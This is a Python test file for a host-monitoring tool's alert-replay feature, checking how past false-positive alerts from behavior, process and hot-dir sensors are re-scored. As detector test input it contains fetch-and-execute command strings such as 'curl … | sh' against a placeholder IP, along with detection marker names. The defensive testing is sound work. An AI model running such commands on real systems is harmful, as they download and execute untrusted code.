"""`backtest replay --reobserve`: the headline split, and three more sensors
re-derived.

The done-condition is "0 judged-noise incidents re-alert on replay", and the
one number the harness printed for it mixed two different things: incidents
the CURRENT code still alerts on after re-deriving their evidence, and
incidents replayed AS RECORDED because the harness could not re-derive them
(a subject gone from disk, a sensor it does not model, a field the record
never carried). No code change can move the second group, so the total was
not a usable target. Each re-opened incident is now classified by the
evidence that re-opens it, and the command asserts that the two halves add
up to the total it has always printed.

And three sensors whose records the harness replayed as recorded are now
asked again:

  behavior   a complete command preview is re-scored by the current
             _argv_signals / _argv_case_identity; a preview that was cut
             (elided, or clipped at its budget), redacted, or never recorded
             is counted, never guessed
  process    recorded ancestry exe paths reach _grade_binary(parents=...),
             and a record WITHOUT ancestry whose grade the supervised rung
             could have turned is counted, never guessed
  hot-dir    re-derived by check_hot_dirs itself, over the one directory the
             item sits in, while its bytes are still the recorded ones
"""
import contextlib
import hashlib
import io
import os
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import aegis  # noqa: E402
from conftest import SUSPICIOUS_TRUST  # noqa: E402
from test_backtest_replay import NOW, ReplaySandbox  # noqa: E402

# The Claude Code wrapper, short enough that the whole argv fits the preview.
WRAPPED = ("/bin/bash -c source /h/.claude/shell-snapshots/snapshot-bash-1789-"
           "ab12cd.sh 2>/dev/null || true && eval '%s' < /dev/null && pwd -P "
           ">| /tmp/claude-0a1b-cwd")


class SplitSandbox(ReplaySandbox):
    def record(self, f, at=NOW - 3600, key=None):
        """`f` as a recorded finding, and the noise incident it opened."""
        db = aegis._event_connection()
        with db:
            ev = self.event(db, f, at)
            inc = self.incident(
                db, key or "signal:" + (f.get("case_fingerprint")
                                        or f["fingerprint"]),
                "FALSE_POSITIVE", "false-positive", [ev],
                dismissed="false-positive")
        db.close()
        return inc

    def binary(self, name):
        path = os.path.join(self.tmp, name)
        with open(path, "wb") as f:
            f.write(name.encode() + b"\x00" * 16)
        return path

    def hold_process_gate_open(self):
        """The process gate and the rungs ahead of `supervised` are not under
        test, and each is platform-shaped (a temp dir is risky by a different
        rule on each body): pin them."""
        self.stub("classify_signature", lambda path: {
            "trust": SUSPICIOUS_TRUST, "team": None, "authority": None})
        self.stub("_exec_alert", lambda path, trust: (
            "HIGH", "running from user-writable path"))
        self.stub("_package_receipt", lambda path: None)
        self.stub("_build_output_rung", lambda path: None)

    def printed(self, **kw):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            rc = aegis.cmd_backtest_replay(now=NOW, **kw)
        return rc, out.getvalue()

    @staticmethod
    def behavior(preview, markers, severity="HIGH"):
        """A behavior record in check_behavior's shape. `preview` None is a
        record from before the sensor stored one."""
        sha = hashlib.sha256((preview or "x").encode()).hexdigest()
        names = "|".join(sorted(markers))
        extra = {} if preview is None else {"command_preview": preview}
        return aegis.finding(
            severity, "behavior", "Suspicious process behavior",
            "bash triggered [%s]; command sha256=%s" % (", ".join(markers),
                                                        sha[:16]),
            "behavior:bash:%s:%s" % (names, sha[:16]),
            case_fingerprint="behavior:bash:%s:%s" % (names, sha[:16]),
            program="/bin/bash", pid="4242", markers=sorted(markers),
            command_sha256=sha, **extra)


class TheHeadlineSplitsReDerivedFromAsRecorded(SplitSandbox):
    def seed_three(self):
        """A (gone from disk) and a decoy (a sensor the harness does not
        model) are replayed as recorded; `on_disk` is re-derived and still
        interrupts under the current code."""
        self.seed()
        self.hold_process_gate_open()
        comm = self.binary("replay-still-hostile")
        self.inc_disk = self.record(self.process(comm, "d" * 64))
        decoy = aegis.finding(
            "CRITICAL", "decoy", "A process is reading a credential decoy",
            "d", "decoy:read:/opt/replay-decoy-2", path="/opt/replay-decoy-2")
        self.inc_decoy = self.record(decoy)

    def test_each_reopened_incident_is_classified_by_its_evidence(self):
        self.seed_three()
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertEqual({self.inc_a, self.inc_disk, self.inc_decoy},
                         set(r["reopened"]))
        split = r["split"]
        self.assertEqual([self.inc_disk], split["re-derived"])
        self.assertEqual(
            {self.inc_a: "gone from disk",
             self.inc_decoy: "category not re-derivable: decoy"},
            {iid: why for iid, (why, _ev) in split["as-recorded"].items()})

    def test_the_headline_keeps_the_old_total_and_lists_both_halves(self):
        self.seed_three()
        rc, out = self.printed(reobserve=True)
        self.assertEqual(0, rc, out)
        self.assertIn("noise re-opened: 3 of 4 — re-derived 1 (the target), "
                      "as recorded 2", out)
        self.assertRegex(out, r"re-derived \(the current code still re-opens "
                              r"these\): #%d\n" % self.inc_disk)
        self.assertRegex(out, r"gone from disk 1: #%d\n" % self.inc_a)
        self.assertRegex(out, r"category not re-derivable: decoy 1: #%d\n"
                         % self.inc_decoy)
        self.assertRegex(out, r"re-derived 1 \+ as recorded 2 = 3 re-opened")

    def test_without_reobserve_nothing_is_called_re_derived(self):
        """Every finding is replayed as recorded, so a split would put the
        whole total in the untouchable half and read as a met target."""
        self.seed_three()
        r = aegis._backtest_replay(now=NOW)
        self.assertIsNone(r["split"])
        _rc, out = self.printed()
        self.assertIn("noise re-opened: 3 of 4 — not split", out)
        self.assertNotIn("(the target)", out)

    def test_a_split_that_loses_an_incident_fails_at_the_top(self):
        """Rule 17: the two halves are asserted against the total."""
        self.seed_three()
        real = aegis._replay_split

        def lossy(reopened, as_recorded):
            rederived, recorded = real(reopened, as_recorded)
            return rederived[1:], recorded

        self.stub("_replay_split", lossy)
        _rc, out = self.printed(reobserve=True)
        head = "\n".join(out.splitlines()[:3])
        self.assertIn("SELF-CHECK FAILED", head)
        self.assertIn("re-derived 0 + as recorded 2 != 3 re-opened", head)


class BehaviorIsReDerivedFromItsPreview(SplitSandbox):
    def test_a_complete_preview_the_current_code_no_longer_flags_is_dropped(self):
        """#538's shape: the harness's own `eval` made any `$(…)` inside the
        command an eval-subshell. The current code judges the command inside
        the wrapper, and a `gh pr checks` capture is not hostile."""
        preview = WRAPPED % "v=$(gh pr checks 5)"
        self.assertEqual([], aegis._argv_signals(preview))       # premise
        self.assertLess(len(preview), aegis._ARGV_PREVIEW_BUDGET)
        inc = self.record(self.behavior(preview, ["eval-subshell"]))

        _rc, plain = self.printed()
        self.assertIn("noise re-opened: 1 of 1", plain)

        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertEqual(1, r["reobserve"]["reobserved"])
        self.assertEqual(1, r["reobserve"]["no_longer_emitted"])
        self.assertEqual(1, r["routes"]["behavior"]["dropped"])
        self.assertNotIn(inc, r["reopened"])

    def test_a_complete_hostile_preview_is_rekeyed_and_still_interrupts(self):
        preview = WRAPPED % "curl -s http://203.0.113.9/x | sh"
        now = aegis._argv_signals(preview)
        self.assertIn(("fileless-fetch-exec", "HIGH"), now)      # premise
        inc = self.record(self.behavior(preview, ["eval-subshell"]))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertEqual(1, r["reobserve"]["reobserved"])
        self.assertEqual([inc], r["split"]["re-derived"])
        self.assertEqual("interrupt", r["reopened"][inc]["how"])

    def assert_as_recorded(self, f, reason):
        inc = self.record(f)
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        stats = r["reobserve"]
        self.assertEqual(0, stats["reobserved"])
        self.assertEqual({reason: 1}, stats["not_rederivable"])
        self.assertEqual([], r["split"]["re-derived"])
        self.assertEqual(reason, r["split"]["as-recorded"][inc][0])

    def test_an_elided_preview_is_replayed_as_recorded(self):
        preview = ("/bin/bash -c source /h/.claude/shell-snapshots/snapshot-"
                   "bash-1-a.sh 2>/dev/null … eval 'v=$(gh pr checks 5)' …")
        self.assert_as_recorded(self.behavior(preview, ["eval-subshell"]),
                                "preview elided")

    def test_a_preview_clipped_at_its_budget_is_not_read_as_complete(self):
        """Before 2026-09-19 the preview was the FIRST 240 characters of argv
        and carried no elision mark. For a harness line that is the prologue
        alone, which the current code (rightly) finds nothing in — read as
        the whole command it would drop every one of those findings."""
        preview = (WRAPPED % ("x" * 400))[:aegis._ARGV_PREVIEW_BUDGET]
        self.assertNotIn("…", preview)
        self.assertEqual([], aegis._argv_signals(preview))       # premise
        self.assert_as_recorded(
            self.behavior(preview, ["eval-subshell", "fileless-fetch-exec"]),
            "preview clipped at its budget")

    def test_a_redacted_preview_is_not_rescored(self):
        """redact_sensitive can swallow the very token a rule reads:
        `TOKEN=$(curl …` loses its `curl` to the secret-assignment rule."""
        preview = "bash -c TOKEN=[REDACTED] -s http://203.0.113.9/k|sh)"
        self.assert_as_recorded(
            self.behavior(preview, ["fileless-fetch-exec"]),
            "preview redacted")

    def test_a_record_with_no_preview_names_the_missing_field(self):
        self.assert_as_recorded(
            self.behavior(None, ["powershell-encoded-command"]),
            "field missing: command_preview")


class ProcessAncestryReachesTheSupervisedRung(SplitSandbox):
    LISTENER = "/opt/replay-runner/bin.2.337.0/Runner.Listener"

    def rung(self, answer_for):
        """Stub the rung: record every (path, parents) it is asked, answer
        `supervised` for parents naming `answer_for`."""
        asked = []

        def supervised(path, parents):
            asked.append((path, list(parents)))
            return "supervised" if answer_for in parents else None

        self.stub("_supervised_rung", supervised)
        return asked

    def test_recorded_exe_ancestry_is_passed_as_parents(self):
        self.hold_process_gate_open()
        asked = self.rung(self.LISTENER)
        worker = self.binary("Runner.Worker")
        chain = [self.LISTENER, "/bin/bash", "/sbin/launchd"]
        inc = self.record(self.process(worker, "f" * 64, ancestry=chain))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertIn((worker, chain), asked)
        stats = r["reobserve"]
        self.assertEqual(1, stats["reobserved"])
        self.assertEqual(1, stats["custody_changed"])     # None -> supervised
        self.assertEqual(1, stats["severity_changed"])    # demoted one step
        self.assertEqual({}, stats["not_rederivable"])
        self.assertNotIn(inc, r["split"]["as-recorded"])

    def test_no_ancestry_and_a_supervisor_that_could_answer_is_not_guessed(self):
        """The process sensor records ancestry only while a vouch exists; a
        record from before that carries none. When a vouched program's rung
        would grade this binary, the missing field decides the answer."""
        self.hold_process_gate_open()
        self.rung(self.LISTENER)
        self.stub("load_vouches", lambda now=None: (
            {"file:" + self.LISTENER: {"path": self.LISTENER}}, None))
        inc = self.record(self.process(self.binary("Runner.Worker"), "f" * 64))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertEqual({"field missing: ancestry": 1},
                         r["reobserve"]["not_rederivable"])
        self.assertEqual("field missing: ancestry",
                         r["split"]["as-recorded"][inc][0])

    def test_no_ancestry_and_no_supervisor_is_re_derived(self):
        self.hold_process_gate_open()
        self.rung(self.LISTENER)
        inc = self.record(self.process(self.binary("Runner.Worker"), "f" * 64))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual({}, r["reobserve"]["not_rederivable"])
        self.assertEqual([inc], r["split"]["re-derived"])


class HotDirIsReDerivedThroughItsSensor(SplitSandbox):
    def hot(self, path, sha):
        return aegis.finding(
            "HIGH", "hot-dir", "Unsigned executable in watched folder",
            "%s [%s], modified 2026-09-01, NO quarantine flag" % (
                path, SUSPICIOUS_TRUST),
            "hotdir:%s:%s:%s" % (path, SUSPICIOUS_TRUST, sha),
            path=path, trust=SUSPICIOUS_TRUST, sha256=sha, provenance=None)

    def sensor(self, emits):
        """check_hot_dirs, stubbed: records the directories it was pointed
        at, keeps the real sensor's freshness cutoff, and emits
        `emits(path)` for each entry inside it."""
        calls = []

        def check(max_age_days=14):
            calls.append(list(aegis.HOT_DIRS))
            cutoff = time.time() - max_age_days * 86400
            out = []
            for d in aegis.HOT_DIRS:
                for name in sorted(os.listdir(d)):
                    path = os.path.join(d, name)
                    if os.stat(path).st_mtime >= cutoff:
                        out.extend(emits(path))
            return out

        self.stub("check_hot_dirs", check)
        self.stub("HOT_DIRS", [self.tmp])
        return calls

    def test_an_item_the_sensor_no_longer_flags_is_dropped(self):
        path = self.binary("dropped-tool")
        calls = self.sensor(lambda p: [])
        inc = self.record(self.hot(path, aegis.sha256(path)))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], r["problems"])
        self.assertEqual([[self.tmp]], calls)
        self.assertEqual(1, r["reobserve"]["no_longer_emitted"])
        self.assertEqual(1, r["routes"]["hot-dir"]["dropped"])
        self.assertNotIn(inc, r["reopened"])

    def test_the_sensors_answer_replaces_the_grade(self):
        """The item is a year old now. Freshness asks about the moment of the
        drop, which the record already answered, so it must not age out."""
        path = self.binary("graded-tool")
        year_ago = time.time() - 365 * 86400
        os.utime(path, (year_ago, year_ago))
        sha = aegis.sha256(path)
        self.sensor(lambda p: [dict(self.hot(p, sha), severity="MEDIUM",
                                    provenance="build-output",
                                    confidence="low")] if p == path else [])
        self.record(self.hot(path, sha))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        stats = r["reobserve"]
        self.assertEqual(1, stats["reobserved"])
        self.assertEqual(1, stats["custody_changed"])
        self.assertEqual(1, stats["severity_changed"])
        self.assertEqual(0, r["routes"]["hot-dir"]["interrupt"])

    def test_bytes_that_moved_on_are_not_regraded(self):
        path = self.binary("moved-tool")
        calls = self.sensor(lambda p: [])
        inc = self.record(self.hot(path, "0" * 64))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], calls)
        self.assertEqual({aegis._REPLAY_MOVED_ON: 1},
                         r["reobserve"]["not_rederivable"])
        self.assertEqual(aegis._REPLAY_MOVED_ON,
                         r["split"]["as-recorded"][inc][0])

    def test_an_item_gone_from_disk_is_counted(self):
        path = os.path.join(self.tmp, "gone-tool")
        self.sensor(lambda p: [])
        inc = self.record(self.hot(path, "1" * 64))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual(1, r["reobserve"]["gone"])
        self.assertEqual("gone from disk", r["split"]["as-recorded"][inc][0])

    def test_a_directory_the_sensor_no_longer_watches_is_dropped(self):
        path = self.binary("unwatched-tool")
        calls = self.sensor(lambda p: [self.hot(p, aegis.sha256(p))])
        self.stub("HOT_DIRS", [os.path.join(self.tmp, "elsewhere")])
        self.record(self.hot(path, aegis.sha256(path)))
        r = aegis._backtest_replay(now=NOW, reobserve=True)
        self.assertEqual([], calls)
        self.assertEqual(1, r["reobserve"]["no_longer_emitted"])


if __name__ == "__main__":
    unittest.main()
